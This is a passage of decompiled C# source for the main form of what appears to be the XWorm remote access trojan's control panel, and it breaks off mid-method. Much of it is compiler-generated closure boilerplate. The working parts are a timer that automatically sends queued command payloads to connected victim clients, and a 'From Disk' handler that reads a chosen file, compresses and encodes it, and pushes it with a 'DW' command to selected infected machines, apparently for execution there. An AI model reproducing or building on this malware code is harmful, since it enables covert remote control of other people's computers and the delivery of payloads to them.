#define DEBUG
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm;

[DesignerGenerated]
public class Main : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__758_002D0
	{
		public List<GClass5> _0024VB_0024Local_clients;

		public Main _0024VB_0024Me;

		public _Closure_0024__758_002D0(_Closure_0024__758_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_clients = arg0._0024VB_0024Local_clients;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			object object_ = GClass19.object_0;
			ObjectFlowControl.CheckForSyncLockOnValueType(object_);
			bool lockTaken = false;
			try
			{
				Monitor.Enter(object_, ref lockTaken);
				foreach (ListViewItem selectedItem in _0024VB_0024Me.Lv1.SelectedItems)
				{
					_0024VB_0024Local_clients.Add((GClass5)selectedItem.Tag);
				}
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(object_);
				}
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R760_002D0
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R760_002D0(_Closure_0024__R760_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R2(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R766_002D2
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R766_002D2(_Closure_0024__R766_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R4(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_766_TimerTask_Tick : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal Main _0024VB_0024Me;

		internal List<GClass9>.Enumerator _0024S0;

		internal GClass9 _0024VB_0024ResumableLocal_asyncTask_00241;

		internal List<GClass5>.Enumerator _0024S2;

		internal GClass5 _0024VB_0024ResumableLocal_C_00243;

		internal _Closure_0024__R766_002D2 _Closure_0024__R766_002D2_0;

		internal Exception _0024VB_0024ResumableLocal_ex_00245;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num <= 1u)
				{
				}
				try
				{
					if ((uint)num <= 1u || (_0024VB_0024Me.gclass9s_0.Count > 0 && GClass19.gclass5s_0.Count > 0))
					{
						try
						{
							if (num != 0)
							{
								if (num != 1)
								{
									_0024S0 = _0024VB_0024Me.gclass9s_0.ToList().GetEnumerator();
									goto IL_008a;
								}
								num = -1;
								_0024State = -1;
								return;
							}
							num = -1;
							_0024State = -1;
							TaskAwaiter awaiter = _0024A0;
							_0024A0 = default(TaskAwaiter);
							goto IL_01d7;
							IL_008a:
							if (_0024S0.MoveNext())
							{
								_0024VB_0024ResumableLocal_asyncTask_00241 = _0024S0.Current;
								if (_0024VB_0024Me.method_3(_0024VB_0024ResumableLocal_asyncTask_00241._id))
								{
									try
									{
										_0024S2 = GClass19.gclass5s_0.ToList().GetEnumerator();
										while (_0024S2.MoveNext())
										{
											_0024VB_0024ResumableLocal_C_00243 = _0024S2.Current;
											if (!_0024VB_0024ResumableLocal_asyncTask_00241.strings_0.Contains(_0024VB_0024ResumableLocal_C_00243.string_1))
											{
												Debug.WriteLine("task executed");
												_0024VB_0024ResumableLocal_asyncTask_00241.strings_0.Add(_0024VB_0024ResumableLocal_C_00243.string_1);
												_0024VB_0024Me.method_2(_0024VB_0024ResumableLocal_asyncTask_00241._id);
												_Closure_0024__R766_002D2_0 = new _Closure_0024__R766_002D2(_Closure_0024__R766_002D2_0);
												_Closure_0024__R766_002D2_0._0024VB_0024NonLocal_2 = _0024VB_0024ResumableLocal_C_00243;
												ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
												{
													_Closure_0024__R766_002D2_0._0024VB_0024NonLocal_2.method_1((byte[])a0);
												}, _0024VB_0024ResumableLocal_asyncTask_00241._msgPack);
											}
										}
									}
									finally
									{
										if (num < 0)
										{
											((IDisposable)_0024S2).Dispose();
										}
									}
									awaiter = Task.Delay(15000).GetAwaiter();
									if (!awaiter.IsCompleted)
									{
										num = 0;
										_0024State = 0;
										_0024A0 = awaiter;
										ref AsyncVoidMethodBuilder reference = ref _0024Builder;
										VB_0024StateMachine_766_TimerTask_Tick stateMachine = this;
										reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
										return;
									}
									goto IL_01d7;
								}
								_0024VB_0024Me.gclass9s_0.Remove(_0024VB_0024ResumableLocal_asyncTask_00241);
								Debug.WriteLine("task removed");
							}
							goto end_IL_0037;
							IL_01d7:
							awaiter.GetResult();
							awaiter = default(TaskAwaiter);
							goto IL_008a;
							end_IL_0037:;
						}
						finally
						{
							if (num < 0)
							{
								((IDisposable)_0024S0).Dispose();
							}
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					_0024VB_0024ResumableLocal_ex_00245 = ex2;
					Debug.WriteLine(_0024VB_0024ResumableLocal_ex_00245.Message);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R769_002D4
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R769_002D4(_Closure_0024__R769_002D4 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R6(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R799_002D6
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R799_002D6(_Closure_0024__R799_002D6 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R8(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R800_002D8
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R800_002D8(_Closure_0024__R800_002D8 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R10(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R801_002D10
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R801_002D10(_Closure_0024__R801_002D10 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R12(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R802_002D12
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R802_002D12(_Closure_0024__R802_002D12 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R14(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R803_002D14
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R803_002D14(_Closure_0024__R803_002D14 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R16(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R805_002D16
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R805_002D16(_Closure_0024__R805_002D16 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R18(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R806_002D18
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R806_002D18(_Closure_0024__R806_002D18 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R20(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R807_002D20
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R807_002D20(_Closure_0024__R807_002D20 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R22(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R808_002D22
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R808_002D22(_Closure_0024__R808_002D22 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R24(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R809_002D24
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R809_002D24(_Closure_0024__R809_002D24 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R26(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__810_002D0
	{
		public byte[] _0024VB_0024Local_B;

		public _Closure_0024__810_002D1 _Closure_0024__810_002D1_0;

		public _Closure_0024__810_002D0(_Closure_0024__810_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_B = arg0._0024VB_0024Local_B;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Local_B = Module0.smethod_6("DW" + GClass19.string_0 + Path.GetExtension(_Closure_0024__810_002D1_0._0024VB_0024Local_o.FileName) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(_Closure_0024__810_002D1_0._0024VB_0024Local_o.FileName))));
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__810_002D1
	{
		public OpenFileDialog _0024VB_0024Local_o;

		public _Closure_0024__810_002D1(_Closure_0024__810_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_o = arg0._0024VB_0024Local_o;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R810_002D26
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R810_002D26(_Closure_0024__R810_002D26 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R28(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_810_DiskToolStripMenuItem_Click : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal Main _0024VB_0024Me;

		internal _Closure_0024__810_002D1 _Closure_0024__810_002D1_0;

		internal OpenFileDialog _0024W1;

		internal _Closure_0024__810_002D0 _Closure_0024__810_002D0_0;

		internal IEnumerator _0024S3;

		internal GClass5 _0024VB_0024ResumableLocal_C_00244;

		internal _Closure_0024__R810_002D26 _Closure_0024__R810_002D26_0;

		internal Exception _0024VB_0024ResumableLocal_ex_00246;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num <= 1u || _0024VB_0024Me.Lv1.SelectedItems.Count > 0)
				{
					try
					{
						TaskAwaiter awaiter;
						switch (num)
						{
						default:
							_Closure_0024__810_002D1_0 = new _Closure_0024__810_002D1(_Closure_0024__810_002D1_0);
							_Closure_0024__810_002D1_0._0024VB_0024Local_o = new OpenFileDialog();
							_0024W1 = _Closure_0024__810_002D1_0._0024VB_0024Local_o;
							_0024W1.Filter = "(*.*)|*.*";
							_0024W1.Title = "From Disk";
							_0024W1 = null;
							if (_Closure_0024__810_002D1_0._0024VB_0024Local_o.ShowDialog() == DialogResult.OK)
							{
								_Closure_0024__810_002D0_0 = new _Closure_0024__810_002D0(_Closure_0024__810_002D0_0);
								_Closure_0024__810_002D0_0._Closure_0024__810_002D1_0 = _Closure_0024__810_002D1_0;
								awaiter = Task.Run([SpecialName] () =>
								{
									_Closure_0024__810_002D0_0._0024VB_0024Local_B = Module0.smethod_6("DW" + GClass19.string_0 + Path.GetExtension(_Closure_0024__810_002D0_0._Closure_0024__810_002D1_0._0024VB_0024Local_o.FileName) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(_Closure_0024__810_002D0_0._Closure_0024__810_002D1_0._0024VB_0024Local_o.FileName))));
								}).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = 0;
									_0024State = 0;
									_0024A0 = awaiter;
									ref AsyncVoidMethodBuilder reference = ref _0024Builder;
									VB_0024StateMachine_810_DiskToolStripMenuItem_Click stateMachine = this;
									reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
									return;
								}
								break;
							}
							goto end_IL_0028;
						case 1:
							num = -1;
							_0024State = -1;
							return;
						case 0:
							num = -1;
							_0024State = -1;
							awaiter = _0024A0;
							_0024A0 = default(TaskAwaiter);
							break;
						}
						awaiter.GetResult();
						awaiter = default(TaskAwaiter);
						try
						{
							_0024S3 = ((IEnumerable)_0024VB_0024Me.method_0()).GetEnumerator();
							while (_0024S3.MoveNext())
							{
								_0024VB_0024ResumableLocal_C_00244 = (GClass5)_0024S3.Current;
								_Closure_0024__R810_002D26_0 = new _Closure_0024__R810_002D26(_Closure_0024__R810_002D26_0);
								_Closure_0024__R810_002D26_0._0024VB_0024NonLocal_2 = _0024VB_0024ResumableLocal_C_00244;
								ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
								{
									_Closure_0024__R810_002D26_0._0024VB_0024NonLocal_2.method_1((byte[])a0);
								}, _Closure_0024__810_002D0_0._0024VB_0024Local_B);
							}
						}
						finally
						{
							if (num < 0 && _0024S3 is IDisposable)
							{
								(_0024S3 as IDisposable).Dispose();
							}
						}
						end_IL_0028:;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00246 = ex2;
						MessageBox.Show(_0024VB_0024ResumableLocal_ex_00246.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R811_002D28
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R811_002D28(_Closure_0024__R811_002D28 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R30(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R812_002D30
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R812_002D30(_Closure_0024__R812_002D30 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R32(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R814_002D32
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R814_002D32(_Closure_0024__R814_002D32 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R34(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R815_002D34
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R815_002D34(_Closure_0024__R815_002D34 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R36(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R816_002D36
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R816_002D36(_Closure_0024__R816_002D36 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R38(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R817_002D38
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R817_002D38(_Closure_0024__R817_002D38 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R40(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R818_002D40
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R818_002D40(_Closure_0024__R818_002D40 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R42(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R819_002D42
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R819_002D42(_Closure_0024__R819_002D42 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R44(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R820_002D44
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R820_002D44(_Closure_0024__R820_002D44 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R46(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R821_002D46
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R821_002D46(_Closure_0024__R821_002D46 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R48(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R822_002D48
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R822_002D48(_Closure_0024__R822_002D48 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R50(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R823_002D50
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R823_002D50(_Closure_0024__R823_002D50 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R52(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R824_002D52
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R824_002D52(_Closure_0024__R824_002D52 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R54(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R825_002D54
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R825_002D54(_Closure_0024__R825_002D54 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R56(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R826_002D56
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R826_002D56(_Closure_0024__R826_002D56 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R58(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R827_002D58
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R827_002D58(_Closure_0024__R827_002D58 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R60(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R828_002D60
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R828_002D60(_Closure_0024__R828_002D60 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R62(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R829_002D62
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R829_002D62(_Closure_0024__R829_002D62 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R64(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R830_002D64
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R830_002D64(_Closure_0024__R830_002D64 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R66(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R831_002D66
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R831_002D66(_Closure_0024__R831_002D66 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R68(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R833_002D68
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R833_002D68(_Closure_0024__R833_002D68 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R70(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R834_002D70
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R834_002D70(_Closure_0024__R834_002D70 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R72(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R835_002D72
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R835_002D72(_Closure_0024__R835_002D72 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R74(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R836_002D74
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R836_002D74(_Closure_0024__R836_002D74 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R76(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R837_002D76
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R837_002D76(_Closure_0024__R837_002D76 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R78(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R838_002D78
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R838_002D78(_Closure_0024__R838_002D78 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R80(object a0)
		{
